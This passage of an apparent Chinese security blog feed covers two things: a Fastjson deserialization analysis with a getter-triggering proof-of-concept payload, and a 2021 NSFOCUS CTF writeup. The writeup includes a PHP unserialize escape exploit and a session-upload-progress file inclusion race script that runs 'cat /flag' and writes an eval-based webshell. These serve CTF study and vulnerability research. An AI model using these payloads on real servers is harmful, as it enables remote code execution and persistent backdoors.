src="/2021/12/18/Java_07/y1IzMJ8o8L8rXBgv4GiLHyAw4S9fy0wi2cAKxLo1_AU.png" alt="image"></p><p>com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask</p><p>ref的value尝试通过getObject获取，这里获取不到，refValue为null，进入<code>JSONPath.eval</code> ，这是JSONPath解析函数，根据ref从value种获取对应的值</p><p><img src="/2021/12/18/Java_07/EwtSK3Zx1OGC6okgptxt79Y6UPrKFAHfiqgyE6yYcgE.png" alt="image"></p><p><code>JSONPath.eval</code> 最终会调用到<code>getPropertyValue</code> 函数，会尝试调用fieldInfo的get函数或者用反射的方式调用getter</p><p>com.alibaba.fastjson.serializer.FieldSerializer#getPropertyValue</p><p><img src="/2021/12/18/Java_07/eecMcIIF5eW8IsgpndMORKoiR2AQ2Nc3imkY5Vprya4.png" alt="image"></p><p><img src="/2021/12/18/Java_07/rxQd525U3pL1zQDA1dBTnj0H28BW3sEKxHgoFxaMIWM.png" alt="image"></p><h3 id="为什么小于1-2-36-版本不行"><a href="#为什么小于1-2-36-版本不行" class="headerlink" title="为什么小于1.2.36 版本不行"></a>为什么小于<code>1.2.36</code> 版本不行</h3><p>以<code>1.2.35</code> 版本为例，差异主要在</p><p>com.alibaba.fastjson.parser.DefaultJSONParser#handleResovleTask</p><p>要求refValue不为null，且必须时JSONObject类，根据上面的分析，我们的POC获取到的refValue为null，寄</p><p><img src="/2021/12/18/Java_07/i440sPX75sFkCBWW2td7yIiTSZ5FI9JhC13-YNmOEyg.png" alt="image"></p><h2 id="JSONObject-调用-getter"><a href="#JSONObject-调用-getter" class="headerlink" title="JSONObject 调用 getter"></a>JSONObject 调用 getter</h2><p>当Fastjson&lt;=1.2.36时，可以使用这种方法调用任意getter方法，和第一种方法刚好互补</p><p>这个方法来自于Tomcat BasicDataSource利用链，四哥的说法是这条链只能用于Fastjson 1.2.24及更低版本（是这个链的利用），可以参考四哥和kingx的分析</p><p><a href="http://blog.nsfocus.net/fastjson-basicdatasource-attack-chain-0521/" target="_blank" rel="noopener">Fastjson BasicDataSource攻击链简介 – 绿盟科技技术博客 (nsfocus.net)</a></p><p><a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html" target="_blank" rel="noopener">Java动态类加载，当FastJson遇到内网 – KINGX</a></p><h3 id="调用演示-1"><a href="#调用演示-1" class="headerlink" title="调用演示"></a>调用演示</h3><p>Test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCmd</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>触发代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        String payload = <span class="string">"&#123;\n"</span> +</span><br><span class="line">                <span class="string">"    &#123;\n"</span> +</span><br><span class="line">                <span class="string">"        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n"</span> +</span><br><span class="line">                <span class="string">"        \"x\":&#123;\n"</span> +</span><br><span class="line">                <span class="string">"                \"@type\": \"com.vuln.Test\",\n"</span> +</span><br><span class="line">                <span class="string">"                \"cmd\": \"open -a Calculator\"\n"</span> +</span><br><span class="line">                <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                <span class="string">"    &#125;: \"x\"\n"</span> +</span><br><span class="line">                <span class="string">"&#125;"</span>;</span><br><span class="line">        Object o = JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/18/Java_07/gLO4GOwvo8ZlfhPDq-30euZ3i-xAN-cZVTKbfA5s9IU.png" alt="image"></p><h3 id="调用分析-1"><a href="#调用分析-1" class="headerlink" title="调用分析"></a>调用分析</h3><p>巧妙利用了<code>JSONObject.toString</code> ，<code>JSONObject</code> 继承了JSON抽象类</p><p>com.alibaba.fastjson.JSON#toString，进行序列化操作，object 转 str</p><p><img src="/2021/12/18/Java_07/DNKcgs8PK82g-frQKbWyo0_oAIG2ixoYRNM-OMw7Xn0.png" alt="image"></p><p>Fastjson使用ASM来代替反射，通过ASM的<code>ClassWriter</code>来生成<code>JavaBeanSerializer</code>的子类，重写<code>write</code>方法，<code>JavaBeanSerializer</code>中的<code>write</code>方法会使用反射从<code>JavaBean</code>中获取相关信息，ASM针对不同类会生成独有的序列化工具类，这里如<code>ASMSerializer_1_Test</code> ，也会调用getter获取类种相关信息，更详细可以参考</p><p><a href="https://segmentfault.com/a/1190000040188046" target="_blank" rel="noopener">ASM在FastJson中的应用 - SegmentFault 思否</a></p><p><img src="/2021/12/18/Java_07/UO5RTYm2MgYBsV1JigXlUSsymP_GS3BHMc1eSQoIDw4.png" alt="image"></p><p>那么我们只要在反序列化过程中，找到一处可以使用JSONObject调用toString的地方就可以了</p><p>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</p><p><img src="/2021/12/18/Java_07/cysePz0X3FnDb9kFbAF0LEM2CEHiaUKZgNGm_snSgCQ.png" alt="image"></p><p>Fastjson在解析的时候如果遇到<code>{</code>，会加一层JSONObject，那么只需将key构造成JSONObject，类似{{some}:x} 即可</p><p>com.alibaba.fastjson.parser.DefaultJSONParser#parse</p><p><img src="/2021/12/18/Java_07/kBvFcSELPIW3pX6AvQjqxpokf1-_iF6VYLnodDWVjuo.png" alt="image"></p><h3 id="为什么大于1-2-36版本不行"><a href="#为什么大于1-2-36版本不行" class="headerlink" title="为什么大于1.2.36版本不行"></a>为什么大于<code>1.2.36</code>版本不行</h3><p>以<code>1.2.37</code> 版本为例</p><p>com.alibaba.fastjson.parser.DefaultJSONParser#parse</p><p>直接入口点掐了，不再调用toString函数</p><p><img src="/2021/12/18/Java_07/SQ0ixs0rj5ufKArY25-PZfc6MABdCUVA02mPP1Liqjs.png" alt="image"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/solitudi/article/details/120275526" target="_blank" rel="noopener">Fastjson＞=1.2.36$ref引用可触发get方法分析_Y4tacker</a></li><li>[利用 fastjson $ref 构造 poc](</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;众所周知，在 Fastjson中 parse 会识别并调用目标类的特定 setter 方法及特定的 getter 方法，&lt;strong&gt;特定规则其实总结起来就是一般的setter方法以及一般的返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong的getter方法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;那么对于一般的不满足条件的getter方法能否进行调用呢&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Java" scheme="https://jlkl.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>绿盟杯2021初赛 Writeup by 0xfa</title>
    <link href="https://jlkl.github.io/2021/10/29/Web_20/"/>
    <id>https://jlkl.github.io/2021/10/29/Web_20/</id>
    <published>2021-10-29T09:56:18.000Z</published>
    <updated>2021-10-29T10:01:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h3><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class;</span><br><span class="line">    <span class="keyword">public</span> $user;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class = <span class="string">"safe"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = <span class="string">"ctfer"</span>;</span><br><span class="line">        $context = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;user);</span><br><span class="line">        <span class="keyword">foreach</span>($context <span class="keyword">as</span> $f)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $f;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $context = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;class (<span class="keyword">$this</span>-&gt;user);</span><br><span class="line">        <span class="keyword">foreach</span>($context <span class="keyword">as</span> $f)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $f;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">safe</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $user;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"hello "</span>.<span class="keyword">$this</span>-&gt;user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">'data'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $demo=<span class="keyword">new</span> Demo;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"/flag is not here! Baby~"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'system'</span>,<span class="string">'flag'</span>,<span class="string">'eval'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter, <span class="string">''</span>, $info);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$profile[<span class="string">'path'</span>] = $_POST[<span class="string">'path'</span>];</span><br><span class="line">$profile[<span class="string">'file'</span>] = $_POST[<span class="string">'file'</span>];</span><br><span class="line">$fun_ser = check(serialize($profile));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(strpos($fun_ser, <span class="string">'log'</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$ser_info = unserialize($fun_ser);</span><br><span class="line">var_dump(readfile($ser_info[<span class="string">'file'</span>]));</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Demo&#123;</span><br><span class="line">    public <span class="variable">$class</span>;</span><br><span class="line">    public <span class="variable">$user</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="regexp">//</span> <span class="variable">$this</span>-&gt;class = <span class="string">"safe"</span>;</span><br><span class="line">        <span class="regexp">//</span> <span class="variable">$this</span>-&gt;user = <span class="string">"ctfer"</span>;</span><br><span class="line">        <span class="regexp">//</span> <span class="variable">$context</span> = new <span class="variable">$this</span>-&gt;class (<span class="variable">$this</span>-&gt;user);</span><br><span class="line">        <span class="regexp">//</span> foreach(<span class="variable">$context</span> as <span class="variable">$f</span>)&#123;</span><br><span class="line">        <span class="regexp">//</span>     echo <span class="variable">$f</span>;</span><br><span class="line">        <span class="regexp">//</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="regexp">//</span> public <span class="keyword">function</span> __wakeup()</span><br><span class="line">    <span class="regexp">//</span> &#123;</span><br><span class="line">    <span class="regexp">//</span>     <span class="variable">$context</span> = new <span class="variable">$this</span>-&gt;class (<span class="variable">$this</span>-&gt;user);</span><br><span class="line">    <span class="regexp">//</span>     foreach(<span class="variable">$context</span> as <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="regexp">//</span>         echo <span class="variable">$f</span>;</span><br><span class="line">    <span class="regexp">//</span>     &#125;</span><br><span class="line">    <span class="regexp">//</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=new Demo();</span><br><span class="line"> </span><br><span class="line"><span class="regexp">//</span> <span class="variable">$a</span>-&gt;user=<span class="string">'./*.php'</span>;</span><br><span class="line"><span class="regexp">//</span> <span class="variable">$a</span>-&gt;class= <span class="string">'GlobIterator'</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;class= <span class="string">'SplFileObject'</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;user=<span class="string">'/proc/self/cwd/flag.php'</span>;</span><br><span class="line">echo urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>使用GlobIterator列目录， SplFileObject读文件<br>得出flag.php的源码，反序列化逃逸，然后post path和file得出flag</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"/flag is not here! Baby~"</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span>&#123;</span></span><br><span class="line"><span class="php">    $filter_arr = <span class="keyword">array</span>(<span class="string">'system'</span>,<span class="string">'flag'</span>,<span class="string">'eval'</span>);</span></span><br><span class="line"><span class="php">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> preg_replace($filter, <span class="string">''</span>, $info);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">$profile[<span class="string">'path'</span>] = <span class="string">'systemsystemsystemsystem'</span>;</span></span><br><span class="line"><span class="php">$profile[<span class="string">'file'</span>] = <span class="string">'aaaaa";s:4:"file";s:5:"/fflaglag";&#125;'</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">$fun_ser = check(serialize($profile));</span></span><br><span class="line"><span class="php">var_dump($fun_ser);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(strpos($fun_ser, <span class="string">'log'</span>) !== <span class="keyword">false</span>)&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">$ser_info = unserialize($fun_ser);</span></span><br><span class="line"><span class="php">var_dump(readfile($ser_info[<span class="string">'file'</span>]));</span></span><br><span class="line"><span class="php"><span class="comment">//flag&#123;3e1e6f1dba7622e67d5c674590fe8c3c&#125;</span></span></span><br></pre></td></tr></table></figure><h3 id="寻宝奇兵"><a href="#寻宝奇兵" class="headerlink" title="寻宝奇兵"></a>寻宝奇兵</h3><p>第一层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">$SECRET=<span class="string">"There is no treasure here"</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">"users"</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>($_COOKIE[<span class="string">"users"</span>]===<span class="string">"explorer"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Explorers are not welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">            $hash = $_COOKIE[<span class="string">"hash"</span>];</span><br><span class="line">            $users=$_COOKIE[<span class="string">"users"</span>];</span><br><span class="line">            <span class="keyword">if</span>($hash === md5($SECRET.$users))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;script &gt;alert('恭喜"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                setcookie(<span class="string">"users"</span>, <span class="string">"explorer"</span>);</span><br><span class="line">                setcookie(<span class="string">"hash"</span>, md5($SECRET . <span class="string">"explorer"</span>));</span><br><span class="line">            &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>$SECRET直接给出，构造hash即可</p><p>第二层：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line">session_start();</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'seed'</span>]))&#123;</span><br><span class="line">                    $_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">                $table = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">                $pass=<span class="string">''</span>;</span><br><span class="line">                <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; <span class="number">24</span>; $i++ )&#123;</span><br><span class="line">                    $pass.=substr($table, mt_rand(<span class="number">0</span>, strlen($table) - <span class="number">1</span>), <span class="number">1</span>); </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">                    <span class="keyword">if</span>($pass==$_POST[<span class="string">'password'</span>])&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"&lt;script &gt;alert('恭喜你"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>伪随机数，跟着网上文章打就行：<a href="https://blog.csdn.net/qq_45521281/article/details/107302795" target="_blank" rel="noopener">https://blog.csdn.net/qq_45521281/article/details/107302795</a><br>第三层</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">'/[flag].*[php]/is'</span>, $data);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">'treasure'</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_php($_POST[<span class="string">'treasure'</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script &gt;alert('这个不能拿走');&lt;/script&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">'/flag.php/is'</span>, $_POST[<span class="string">'treasure'</span>]))&#123;</span><br><span class="line">               highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>复现：<a href="https://blog.csdn.net/qq_38783875/article/details/85288671" target="_blank" rel="noopener">https://blog.csdn.net/qq_38783875/article/details/85288671</a><br>拿到flag<br><img src="https://codimd.s3.shivering-isles.com/demo/uploads/upload_92831dd03c4a28653674dd6f91fa151b.png" alt></p><h3 id="mid"><a href="#mid" class="headerlink" title="mid"></a>mid</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    session_start();</span></span><br><span class="line"><span class="php">    <span class="keyword">include</span> $_GET[<span class="number">1</span>];</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>文件包含，直接session_upload_progress</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">sessid = <span class="string">'testqwer2'</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b'a'</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            <span class="string">'http://119.61.19.212:57303/index.php'</span>,</span><br><span class="line">            data=&#123;<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>:<span class="string">"&lt;?php system('cat /flag');phpinfo();fputs(fopen('/var/www/html/myshell.php','w'),'&lt;?php phpinfo();@eval($_POST[whoami])?&gt;');?&gt;"</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">"file"</span>:(<span class="string">'q.txt'</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">'PHPSESSID'</span>:sessid&#125;</span><br><span class="line">        )</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f'http://119.61.19.212:57303/index.php?1=../../../../../../../../var/lib/php/sessions/sess_<span class="subst">&#123;sessid&#125;</span>'</span>)</span><br><span class="line">        <span class="comment"># print('[+++]retry')</span></span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(<span class="string">'[+++]retry'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(response.text)</span><br><span class="line">            